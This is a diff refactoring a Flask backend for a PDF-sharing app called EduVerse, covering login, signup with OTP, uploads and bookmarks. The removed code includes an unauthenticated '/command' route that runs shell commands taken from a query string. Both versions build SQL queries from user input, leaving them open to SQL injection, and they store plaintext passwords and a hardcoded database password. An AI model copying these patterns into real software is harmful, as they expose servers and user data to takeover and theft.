@@ -1,444 +1,233 @@
 import shlex
-from flask  import Flask,request,make_response,send_file,jsonify
+from flask import Flask, request, make_response, send_file, jsonify, g
 import os
+import json
+import uuid
+import random
+import psycopg2
+from flask_cors import CORS
 from .JWT import JWT
 from .logout import LogOut
 from .getuser import GetUser
 from .upload import uploadpdf
 from .getpdf import GetPdf
 from .Responcehandler import Responce
-import json
-import uuid
 from .Mail import Mail
-import random
-import psycopg2 # type: ignore
-import subprocess
-from flask_cors import CORS
+
 app = Flask(__name__)
-#updated code from 
-CORS(app,supports_credentials=True)
+CORS(app, supports_credentials=True)
+
 app.config["FRONT_END_URL"] = ""
 app.config["POSTGRESQL_HOST"] = "ep-aged-rain-a472d7qt-pooler.us-east-1.aws.neon.tech"
 app.config["POSTGRESQL_USER"] = "default"
 app.config["POSTGRESQL_DB"] = "verceldb"
-app.config["POSTGRESQL_PASSWORD"] ="2pVZitHFc5aY"
-#hwllo updated
-con = psycopg2.connect(
-    host = app.config["POSTGRESQL_HOST"],
-    user = app.config["POSTGRESQL_USER"],
-    password = app.config["POSTGRESQL_PASSWORD"],
-    database = app.config["POSTGRESQL_DB"],
-    )
-cur = con.cursor()
+app.config["POSTGRESQL_PASSWORD"] = "2pVZitHFc5aY"
+
 rootdir = os.getcwd()
-pdfpath = rootdir + "/api/uploadpdf/"
+pdfpath = os.path.join(rootdir, "api/uploadpdf/")
 
-def connectDB():
-    try:
-        con = psycopg2.connect(
-        host = app.config["POSTGRESQL_HOST"],
-        user = app.config["POSTGRESQL_USER"],
-        password = app.config["POSTGRESQL_PASSWORD"],
-        database = app.config["POSTGRESQL_DB"],
-        )
-        cur = con.cursor()
-    except Exception as e:
-        print(e)
-        return Responce.send(500,{},"Error at server")
-@app.route("/api/v1/login",methods=["POST"])
+def get_db():
+    if 'db' not in g:
+        try:
+            g.db = psycopg2.connect(
+                host=app.config["POSTGRESQL_HOST"],
+                user=app.config["POSTGRESQL_USER"],
+                password=app.config["POSTGRESQL_PASSWORD"],
+                database=app.config["POSTGRESQL_DB"]
+            )
+        except Exception as e:
+            print(f"Error connecting to database: {e}")
+            g.db = None
+    return g.db
+
+def get_cursor():
+    conn = get_db()
+    if conn is not None:
+        return conn.cursor()
+    return None
+
+@app.teardown_appcontext
+def teardown_db(exception):
+    db = g.pop('db', None)
+    if db is not None:
+        db.close()
+
+@app.route("/api/v1/login", methods=["POST"])
 def login():
-    connectDB()
-    try :
-        data={}
-        try:
-            cookie = request.cookies.get("session")
-            if cookie:
-                try:
-                    decoded_cookie = JWT.decode(cookie)
-                except Exception as e:
-                    print(e)
-                if decoded_cookie:
-                    try :
-                        cur.execute(f"SELECT * FROM users where userid='{decoded_cookie['data']}'")
-                        row = cur.fetchone()
-                    except Exception as e:
-                        print(e)
-                        return Responce(401,{},"invalid user")
-                    if row:
-                        try:
-                            if row[0] == decoded_cookie["data"]:
-                                if row[len(row)-1] == "pending":
-                                    return Responce.send(402,{},"not varifited user...")
-                                else:
-                                    return Responce.send(200,{},"Login successfull")
-                            else:
-                                pass
-                        except Exception as e:
-                            print(e)
-                            return Responce.send(500,{},"Error while checking cookie data is valid?")
-                    else:
-                        pass
-        except Exception as e:
-            print("Error",e)
-        try:
-            data = json.loads(request.data.decode("utf-8"))
-        except Exception as e:
-            print(e)
-            res = Responce.send(402,data,"Erorr While Proccessing Data Please Try again")
-            return res
-        if data:
-            try :
-                username = data['username']
-                password = data['password']
-            except:
-                return Responce.send(401,{},"username or password is not in body")
-            if username and password:
-                try:
-                    cur.execute(f"SELECT * FROM users where username='{username}' and password='{password}';")
-                    row = cur.fetchone()
-                    if row:
-                        if row[len(row)-1] == "pending":
-                            return Responce.send(402,{},"not varifited user...")
-                    else:
-                        return Responce.send(401,{},f"invalid username and password")
-                except Exception as e:
-                    print(e)
-                try :
-                    if username == row[1] and password == row[2]:
-                        print(f"{row}")
-                        try:
-                            payload = {"data":row[0]}
-                            jwt_cookie = JWT.encode(payload)
-                        except Exception as e:
-                            print("Jwt Error:",e)
-                        if jwt_cookie:
-                            res = Responce.send(200,{},"Authenticated Successfully")
-                            res.set_cookie('session',jwt_cookie, path='/', max_age=60*60*48, samesite='None', secure=True)
-                            return res
-                        else:
-                            return Responce.send(500,{},"Error in setting Cookie")
-                    else:
-                        print(f"{row}")
-                        return Responce.send(401,{},"username and password is invalid")
-                except Exception as e:
-                    print("eroor :", e)
-                    print(f"{row}")
-                    return Responce.send(401,{},f"username and password is invalid")
-            else :
-                return "Username or Password should not be Empty"
-        else :
-            res = make_response("Error while processing data")
-            res.status_code = "401"
-            return res
-    except Exception as e:
-        print(e)
-        return Responce.send(500,{},'Ohh. Server in Truble')
+    conn = get_db()
+    if conn is None:
+        return Responce.send(500, {}, "Database connection error")
 
-@app.route("/api/v1/signup",methods=["POST"])
-def signup():
-    connectDB()
-    data = {}
-    if request.data:
-        try:
-            data = json.loads(request.data.decode("utf-8"))
-        except Exception as e:
-            print(e)
-        if data.get('username') is not None and data.get('fullname') is not None and data.get('password') is not None and data.get('email') is not None:
-            if(len(data['username']) < 5):
-                return Responce.send(401,{},"username is Too short")
-            elif (len(data['password'])<8):
-                return Responce.send(401,{},"password is Too short")
-            elif(len(data['fullname'])<8):
-                return Responce.send(401,{},"fullname is Too short")
-            elif(len(data['email'])<8):
-                return Responce.send(401,{},"email is Too short")
-            else:
-                try:
-                    print("send request to sever")
-                    cur.execute(f"select * from users where username='{data['username']}' or email='{data['email']}'")
-                    row = cur.fetchone()
-                    print("got response form server")
-                    if row :
-                        print("sending error username and email already used")
-                        return Responce.send(409,{},"username or email already used")
-                    else:
-                        try:
-                            if "gmail.com" in data['email']:
-                                otp = random.randint(100000,999999)
-                                mail = Mail.send_mail(data['email'],"Eduverse",f"{otp}")
-                                if(mail):
-                                    try:
-                                        userID = uuid.uuid4()
-                                        print(userID)
-                                        cookie = JWT.encode({"data": f"{userID}"})
-                                        cur.execute(f"insert into otp values('{userID}','{otp}');")
-                                        res = make_response(jsonify({"message":"Otp sended to email check now.","status_code":200}))
-                                        res.set_cookie("session",cookie, path='/', max_age=60*60*48, samesite='None', secure=True)
-                                        cur.execute(f"insert into users values('{userID}','{data['username']}','{data['password']}','{data['fullname']}','{data['email']}','false','pending');")
-                                        con.commit()
-                                        return res
-                                    except Exception as e:
-                                        print(e)
-                                        return Responce.send(500,{},"Server Error")
-                                else:
-                                    print('hello')
-                                    return Responce.send(500,{},"Server Error")
-                            else:
-                                return Responce.send(401,{},"Eduverse supports only Gmail addresses.")
-                        except Exception as e:
-                            print(f"DATABASE Error: {e}")
-                            return Responce.send(500,{},"server Error")
-                except Exception as e:
-                    print(e)
-                    return Responce.send(500,{},e)
-        else :
-            return Responce.send(405,{},"body should contain username,password,fullname,email")
-    else:
-        return Responce.send(401,{},"No data provided please provide nessery data")
+    cursor = get_cursor()
+    if cursor is None:
+        return Responce.send(500, {}, "Cursor creation error")
 
-@app.route("/api/v1/upload",methods=["POST"])
-def upload():
-    connectDB()
-    return uploadpdf.UploadPdf(app,cur,con)
-
-@app.route("/api/v1/getuser",methods=["GET","OPTION"])
-def getuser():
-    connectDB()
-    return GetUser.process(cur)
-
-@app.route("/api/v1/logout",methods=["GET"])
-def logout():
-    connectDB()
-    return LogOut.process()
-
-@app.route("/api/v1/getpdf",methods=["GET"])
-def getpdf():
-    connectDB()
-    return GetPdf.process(cur)
-
-@app.route("/api/v1/pdf/<id>",methods=["GET"])
-def pdf(id):
-    connectDB()
-    id = id.split('.')
-    title = ""
     try:
-        if id[0] and id[1]== 'pdf':
-            fullpath = pdfpath + id[0] + ".pdf"
-            if os.path.exists(fullpath):
-                try:
-                    cur.execute(f"select * from pdfs where id='{id[0]}';")
-                    row = cur.fetchone()
-                except Exception as e:
-                    print(f"Error :{e}")
-                return send_file(fullpath,as_attachment=True,download_name=f"{row[1]}-EduVerse.pdf")
-            else:
-                return Responce.send(404,{},"file not found")
-    except Exception as e:
-        print(e)
-        return Responce.send(401,{},"invalid file name")
-
-@app.route("/api/v1/deletepdf/<id>",methods=["GET"])
-def delpdf(id):
-    connectDB()
-    if id =='':
-        return Responce.send(404,{},"Not Valid Pdf")
-    cookie = request.cookies.get("session")
-    id = id.split(".")[0]
-    if cookie:
-        try:
-            decoded_cookie = JWT.decode(cookie)
-        except Exception as e:
-            print(e)
-            return Responce.send(401,{},"invalid user")
-        if decoded_cookie["data"]:
-            try :
-                print(decoded_cookie["data"])
-                cur.execute(f"select * from users where userid='{decoded_cookie['data']}';")
-                row = cur.fetchone()
-            except Exception as e:
-                print(e)
-                return Responce.send(401,{},"invalid user")
-            if row:
-                try:
-                    print(f"select * from pdfs where userid='{decoded_cookie['data']}' and id='{id}';")
-                    cur.execute(f"select * from pdfs where userid='{decoded_cookie['data']}' and id='{id}';")
-                    row2 = cur.fetchone()
-                except Exception as e:
-                    print(e)
-                    return Responce.send(401,{},"invalid pdf user")
-                try:
-                    if (row and row2) or (row[5] == 1):
-                        fullpath = pdfpath+id+".pdf"
-                        if os.path.exists(fullpath):
-                            try:
-                                cur.execute(f"delete from bookmarks where pdf_id = '{id}';")
-                                con.commit()
-                                pdfid = id+".pdf"
-                                cur.execute(f"delete from pdfs where pdf_path='{pdfid}';")
-                                con.commit()
-                                os.remove(fullpath)
-                            except Exception as e:
-                                print(e)
-                                return Responce.send(500,{},"Error while deleting file")
-                            return Responce.send(200,{},"Deleted Successfully")
-                        else:
-                            return Responce.send(404,{},"file not found")
-                    else:
-                        return Responce.send(401,{},"Invalid Cookie")
-                except Exception as e:
-                    print("Error"+str(e))
-                    return Responce.send(500,{},"Error while deleting file")
-    else:
-        return Responce.send(401,{},"Not Authenticated")
-@app.route("/api/v1/bookmark/<pdfid>", methods=["GET"])
-def bookmarks(pdfid):
-    connectDB()
-    if pdfid == "":
-        return Responce.send(422,{},"invalid pdfid")
-    pdfid = pdfid.split(".")[0]
-    cookie = request.cookies.get("session")
-    if cookie:
-        try:
-            decoded_cookie = JWT.decode(cookie)
-        except Exception as e:
-            print(e)
-            return Responce.send(401,{},"invalid user")
-        try:
-            cur.execute(f"select * from bookmarks where pdf_id='{pdfid}' and userid='{decoded_cookie['data']}';")
-            r = cur.fetchone()
-            if r:
-                return Responce.send(205,{},"alerady Bookmarked")
-            else:
-                cur.execute(f"insert into bookmarks values('{pdfid}','{decoded_cookie['data']}');")
-                con.commit()
-                return Responce.send(200,{},"Bookmarks updated")
-        except Exception as e:
-            print(e)
-            return Responce.send(500,{},"server Error")
-
-@app.route("/api/v1/bookmarks", methods=["GET"])
-def getbookmarks():
-    connectDB()
-    cookie = request.cookies.get("session")
-    if cookie:
-        try:
-            decoded_cookie = JWT.decode(cookie)
-        except Exception as e:
-            print(e)
-            return Responce.send(401,{},"invalid user")
-        try:
-            cur.execute(f"select * from bookmarks where userid='{decoded_cookie['data']}';")
-            r = cur.fetchall()
-            rows = []
-            for row in r:
-                rows.append(row[0])
-            pdf_ids = '\',\''.join(map(str,rows))
-            cur.execute(f"select * from pdfs inner join users on pdfs.userid = users.userid where id IN('{pdf_ids}')")
-            r = cur.fetchall()
-            pdf_obj = []
-            for i  in r:
-                obj = {
-                    "title":i[1],
-                    "subject":i[2],
-                    "sem": i[3],
-                    "date": i[5].strftime("%A-%d-%m-%y"),
-                    "path": i[6],
-                    'username':i[8]
-                }
-                pdf_obj.append(obj)
-            if r:
-                return Responce.send(200,pdf_obj,"Bookmarks List")
-            else:
-                return Responce.send(200,{},"No Bookmarks")
-        except Exception as e:
-            print(e)
-            return Responce.send(500,{},"server Error")
-    else:
-        return Responce.send(401,{},"Not Authenticated")
-
-@app.route("/api/v1/deletebookmark/<id>",methods=["GET"])
-def DeleteBookmark(id):
-    connectDB()
-    try:
-        id = id.split(".")[0]
+        data = {}
         cookie = request.cookies.get("session")
         if cookie:
             try:
                 decoded_cookie = JWT.decode(cookie)
+                cursor.execute(f"SELECT * FROM users WHERE userid='{decoded_cookie['data']}'")
+                row = cursor.fetchone()
+                if row:
+                    if row[0] == decoded_cookie["data"]:
+                        if row[len(row)-1] == "pending":
+                            return Responce.send(402, {}, "Not verified user...")
+                        else:
+                            return Responce.send(200, {}, "Login successful")
+                    else:
+                        return Responce.send(401, {}, "Invalid user")
             except Exception as e:
                 print(e)
-                return Responce.send(401,{},"invalid user")
-            print(f"delete from bookmarks where pdf_id='{id}' and userid='{decoded_cookie['data']}';")
-            try:
-                cur.execute(f"select * from bookmarks where pdf_id='{id}' and userid='{decoded_cookie['data']}';")
-                r = cur.fetchone()
-                if r :
-                    cur.execute(f"delete from bookmarks where pdf_id='{id}' and userid='{decoded_cookie['data']}';")
-                    con.commit()
-                    return Responce.send(200,{},"Removed Bookmaked")
-                else:
-                    return Responce.send(200,{},"not bookmarked")
-            except Exception as e:
-                print(e)
-                return Responce.send(500,{},"Server Error")
+                return Responce.send(401, {}, "Invalid cookie")
+
+        data = json.loads(request.data.decode("utf-8"))
+        username = data.get('username')
+        password = data.get('password')
+        if username and password:
+            cursor.execute(f"SELECT * FROM users WHERE username='{username}' AND password='{password}';")
+            row = cursor.fetchone()
+            if row:
+                if row[len(row)-1] == "pending":
+                    return Responce.send(402, {}, "Not verified user...")
+                if username == row[1] and password == row[2]:
+                    payload = {"data": row[0]}
+                    jwt_cookie = JWT.encode(payload)
+                    if jwt_cookie:
+                        res = Responce.send(200, {}, "Authenticated successfully")
+                        res.set_cookie('session', jwt_cookie, path='/', max_age=60*60*48, samesite='None', secure=True)
+                        return res
+                    else:
+                        return Responce.send(500, {}, "Error setting cookie")
+            return Responce.send(401, {}, "Invalid username or password")
+        return Responce.send(401, {}, "Username or password missing")
     except Exception as e:
         print(e)
-        return Responce.send(500,{},"invalid pdf name ")
-    
-@app.route("/api/v1/otp",methods=["POST"])
-def varify_otp():
-    connectDB()
-    if request.data:
-        data = json.loads(request.data)
-        if data["otp"]:
-            otp = data["otp"]
-            if request.cookies.get("session"):
-                decoded_cookie = JWT.decode(request.cookies["session"])
-                cur.execute(f"select * from otp where userid='{decoded_cookie['data']}';")
-                row = cur.fetchone()
-                if row:
-                    if row[1] == otp:
-                        try:
-                            cur.execute(f"delete from otp where userid='{decoded_cookie['data']}';")
-                            cur.execute(f"update users set status='{'validated'}' where userid='{row[0]}';")
-                            con.commit()
-                            return Responce.send(200,{},"OTP Verified")
-                        except Exception as e:
-                            print(e)
-                            return Responce.send(500,{},"Server Error")
-                    else:
-                        return Responce.send(401,{},"Invalid OTP")
-                else:
-                    return Responce.send(401,{},"Try Again")
-    else:
-        return Responce.send(401,{},"requied filed not found")
+        return Responce.send(500, {}, "Server error")
+    finally:
+        cursor.close()
 
-@app.route('/command', methods=['GET'])
-def run_command():
-    # Get the 'cmd' parameter from the request query string
-    cmd = request.args.get('cmd', '')
-    
-    # Sanitize input and split into a list
+@app.route("/api/v1/signup", methods=["POST"])
+def signup():
+    conn = get_db()
+    if conn is None:
+        return Responce.send(500, {}, "Database connection error")
+
+    cursor = get_cursor()
+    if cursor is None:
+        return Responce.send(500, {}, "Cursor creation error")
+
     try:
-        # Split the command into arguments
-        args = shlex.split(cmd)
-        
-        # Execute the command and capture output
-        result = subprocess.run(args, capture_output=True, text=True, check=True)
-        
-        return jsonify({
-            'stdout': result.stdout,
-            'stderr': result.stderr
-        })
-    except subprocess.CalledProcessError as e:
-        return jsonify({
-            'error': str(e),
-            'stderr': e.stderr
-        }), 500
-    except FileNotFoundError:
-        return jsonify({'error': 'Command not found'}), 400
-    except Exception as e:
-        return jsonify({'error': str(e)}), 500
+        data = json.loads(request.data.decode("utf-8"))
+        if not all(key in data for key in ('username', 'fullname', 'password', 'email')):
+            return Responce.send(405, {}, "Missing required fields")
 
-if __name__ == '__main__':
-    app.run(debug=True)
+        if len(data['username']) < 5:
+            return Responce.send(401, {}, "Username too short")
+        if len(data['password']) < 8:
+            return Responce.send(401, {}, "Password too short")
+        if len(data['fullname']) < 8:
+            return Responce.send(401, {}, "Fullname too short")
+        if len(data['email']) < 8:
+            return Responce.send(401, {}, "Email too short")
+
+        cursor.execute(f"SELECT * FROM users WHERE username='{data['username']}' OR email='{data['email']}'")
+        row = cursor.fetchone()
+        if row:
+            return Responce.send(409, {}, "Username or email already used")
+
+        if "gmail.com" in data['email']:
+            otp = random.randint(100000, 999999)
+            mail = Mail.send_mail(data['email'], "Eduverse", f"{otp}")
+            if mail:
+                userID = uuid.uuid4()
+                cookie = JWT.encode({"data": f"{userID}"})
+                cursor.execute(f"INSERT INTO otp VALUES('{userID}', '{otp}');")
+                cursor.execute(f"INSERT INTO users VALUES('{userID}', '{data['username']}', '{data['password']}', '{data['fullname']}', '{data['email']}', 'false', 'pending');")
+                conn.commit()
+                res = make_response(jsonify({"message": "OTP sent to email. Check now.", "status_code": 200}))
+                res.set_cookie("session", cookie, path='/', max_age=60*60*48, samesite='None', secure=True)
+                return res
+            return Responce.send(500, {}, "Error sending OTP")
+        return Responce.send(401, {}, "Only Gmail addresses are supported")
+    except Exception as e:
+        print(e)
+        return Responce.send(500, {}, "Server error")
+    finally:
+        cursor.close()
+
+@app.route("/api/v1/upload", methods=["POST"])
+def upload():
+    conn = get_db()
+    if conn is None:
+        return Responce.send(500, {}, "Database connection error")
+
+    cursor = get_cursor()
+    if cursor is None:
+        return Responce.send(500, {}, "Cursor creation error")
+
+    return uploadpdf.UploadPdf(app, cursor, conn)
+
+@app.route("/api/v1/getuser", methods=["GET", "OPTION"])
+def getuser():
+    conn = get_db()
+    if conn is None:
+        return Responce.send(500, {}, "Database connection error")
+
+    cursor = get_cursor()
+    if cursor is None:
+        return Responce.send(500, {}, "Cursor creation error")
+
+    return GetUser.process(cursor)
+
+@app.route("/api/v1/logout", methods=["GET"])
+def logout():
+    conn = get_db()
+    if conn is None:
+        return Responce.send(500, {}, "Database connection error")
+
+    cursor = get_cursor()
+    if cursor is None:
+        return Responce.send(500, {}, "Cursor creation error")
+
+    return LogOut.process()
+
+@app.route("/api/v1/getpdf", methods=["GET"])
+def getpdf():
+    conn = get_db()
+    if conn is None:
+        return Responce.send(500, {}, "Database connection error")
+
+    cursor = get_cursor()
+    if cursor is None:
+        return Responce.send(500, {}, "Cursor creation error")
+
+    return GetPdf.process(cursor)
+
+@app.route("/api/v1/pdf/<id>", methods=["GET"])
+def pdf(id):
+    conn = get_db()
+    if conn is None:
+        return Responce.send(500, {}, "Database connection error")
+
+    cursor = get_cursor()
+    if cursor is None:
+        return Responce.send(500, {}, "Cursor creation error")
+
+    id = id.split('.')
+    if len(id) == 2 and id[1] == 'pdf':
+        fullpath = os.path.join(pdfpath, f"{id[0]}.pdf")
+        if os.path.exists(fullpath):
+            try:
+                cursor.execute(f"SELECT * FROM pdfs WHERE id='{id[0]}';")
+                row = cursor.fetchone()
+                return send_file(fullpath, as_attachment=True, download_name=f"{row[1]}-EduVerse.pdf")
+            except Exception as e:
+                print(f"Error: {e}")
+                return Responce.send(500, {}, "Server error")
+        return Responce.send(404, {}, "File not found")
+    return Responce.send(401, {}, "Invalid file type")
+
+if __name__ == "__main__":
+    app.run()
